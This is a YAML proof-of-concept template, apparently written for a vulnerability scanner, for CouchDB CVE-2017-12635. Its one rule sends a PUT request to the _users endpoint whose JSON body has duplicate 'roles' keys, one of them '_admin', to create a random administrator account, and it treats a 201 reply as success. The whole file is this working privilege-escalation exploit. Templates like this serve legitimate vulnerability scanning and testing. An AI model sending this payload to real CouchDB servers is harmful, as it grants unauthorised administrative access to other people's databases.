name: poc-yaml-couchdb-cve-2017-12635
binding: bf82bb24-2d9c-4f00-8867-64b0bfeffe2e
manual: true
detail:
    author: j4ckzh0u(https://github.com/j4ckzh0u)
    links:
        - https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635
    vulnerability:
        level: critical
transport: http
set:
    r1: randomLowercase(32)
rules:
    r0:
        request:
            cache: true
            method: PUT
            path: /_users/org.couchdb.user:{{r1}}
            headers:
                Content-Type: application/json
            body: |-
                {
                  "type": "user",
                  "name": "{{r1}}",
                  "roles": ["_admin"],
                  "roles": [],
                  "password": "{{r1}}"
                }
            follow_redirects: false
        expression: response.status == 201 && response.body.bcontains(bytes("org.couchdb.user:" + r1))
expression: r0()
